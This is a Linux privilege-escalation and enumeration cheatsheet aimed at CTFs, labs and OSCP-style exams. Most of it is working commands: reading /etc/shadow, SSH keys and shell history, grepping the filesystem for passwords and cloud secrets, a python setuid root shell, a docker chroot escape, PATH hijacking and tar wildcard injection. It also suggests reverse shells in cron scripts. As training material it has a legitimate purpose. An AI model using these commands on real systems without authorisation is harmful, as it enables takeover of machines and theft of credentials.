# 🐧 Linux Privilege Escalation & Enumeration Cheatsheet

> Complete Recon + PrivEsc methodology for CTFs, Labs, OSCP-style exams, and real-world misconfigurations.

# 📌 Table of Contents

* [1. Initial Enumeration](#1-initial-enumeration)
* [2. User & Group Enumeration](#2-user--group-enumeration)
* [3. Sudo Abuse](#3-sudo-abuse)
* [4. SUID / SGID Binaries](#4-suid--sgid-binaries)
* [5. Capabilities Abuse](#5-capabilities-abuse)
* [6. Cron Jobs Exploitation](#6-cron-jobs-exploitation)
* [7. Writable Files & Directories](#7-writable-files--directories)
* [8. PATH Hijacking](#8-path-hijacking)
* [9. Shared Library Hijacking](#9-shared-library-hijacking)
* [10. Kernel Exploits](#10-kernel-exploits)
* [11. Docker & Container Escape](#11-docker--container-escape)
* [12. NFS Exploitation](#12-nfs-exploitation)
* [13. Systemd Abuse](#13-systemd-abuse)
* [14. Sensitive Files Checklist](#14-sensitive-files-checklist)
* [15. Network Enumeration](#15-network-enumeration)
* [16. Password & Secret Hunting](#16-password--secret-hunting)
* [17. Memory & Environment Secrets](#17-memory--environment-secrets)
* [18. Wildcard Injection](#18-wildcard-injection)
* [19. SSH Abuse](#19-ssh-abuse)
* [20. Full Quick Recon One-Liner](#20-full-quick-recon-one-liner)

---

# 1. Initial Enumeration

```bash
whoami
id
hostname
uname -a
arch
cat /etc/os-release
cat /etc/issue
```

---

# 2. User & Group Enumeration

```bash
cat /etc/passwd
cat /etc/shadow
cat /etc/group
getent passwd
```

Find real users:

```bash
cat /etc/passwd | grep bash
```

Check home directories:

```bash
ls -la /home
ls -la /root
```

---

# 3. Sudo Abuse

```bash
sudo -l
sudo -V
```

Look for:

* `NOPASSWD`
* Environment preserved
* Editable scripts

If allowed binary found → check **GTFOBins**

### LD_PRELOAD Exploit

```bash
sudo LD_PRELOAD=./shell.so program
```

### Baron Samedit (CVE-2021-3156)

Vulnerable sudo versions < 1.9.5p2

---

# 4. SUID / SGID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

Inspect binary:

```bash
strings binary
ltrace binary
strace binary
```

Check for:

* system()
* exec()
* relative paths

---

# 5. Capabilities Abuse

```bash
getcap -r / 2>/dev/null
```

If python has `cap_setuid`:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

# 6. Cron Jobs Exploitation

```bash
cat /etc/crontab
ls -la /etc/cron*
```

If writable script:

Inject reverse shell.

---

# 7. Writable Files & Directories

```bash
find / -writable -type f 2>/dev/null
find / -type d -writable 2>/dev/null
```

World writable:

```bash
find / -perm -222 -type f 2>/dev/null
```

---

# 8. PATH Hijacking

```bash
echo $PATH
```

If writable directory early in path:

```bash
echo "/bin/bash" > ls
chmod +x ls
export PATH=.:$PATH
```

---

# 9. Shared Library Hijacking

```bash
ldd ./binary
```

If library not found → create malicious `.so`

---

# 10. Kernel Exploits

```bash
uname -r
```

Search:

* Dirty COW
* Dirty Pipe (CVE-2022-0847)
* PwnKit (CVE-2021-4034)

Use:

```bash
searchsploit kernel version
```

---

# 11. Docker & Container Escape

Check container:

```bash
cat /proc/1/cgroup
```

Check docker group:

```bash
ls -la /var/run/docker.sock
```

Exploit:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

# 12. NFS Exploitation

```bash
cat /etc/exports
```

If `no_root_squash`:

Mount and upload SUID shell.

---

# 13. Systemd Abuse

```bash
systemctl list-units --type=service
cat /etc/systemd/system/service.service
```

If writable → inject malicious command.

---

# 14. Sensitive Files Checklist

Always check:

```
/etc/passwd
/etc/shadow
/etc/sudoers
/etc/crontab
/root/
/home/*
/var/www/
/opt/
/tmp/
/dev/shm/
/etc/hosts
```

SSH:

```bash
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
```

History:

```bash
cat ~/.bash_history
cat /root/.bash_history
```

---

# 15. Network Enumeration

```bash
ip a
netstat -tulpn
ss -tulpn
```

Look for:

* Internal DB
* Localhost-only services

---

# 16. Password & Secret Hunting

```bash
grep -Ri "password" /
grep -Ri "PRIVATE KEY" /
grep -Ri "AWS" /
```

Check:

* /var/www
* /opt
* /srv
* config files

---

# 17. Memory & Environment Secrets

```bash
env
strings /proc/*/environ 2>/dev/null
```

Look for:

* API keys
* Tokens
* DB credentials

---

# 18. Wildcard Injection

If script runs:

```bash
tar -zcf backup.tar.gz *
```

Exploit:

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh exploit.sh'
```

---

# 19. SSH Abuse

Check keys:

```bash
ls -la ~/.ssh
```

Check SSH agent:

```bash
echo $SSH_AUTH_SOCK
```

---

# 20. Full Quick Recon One-Liner

```bash
id; uname -a; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab
```

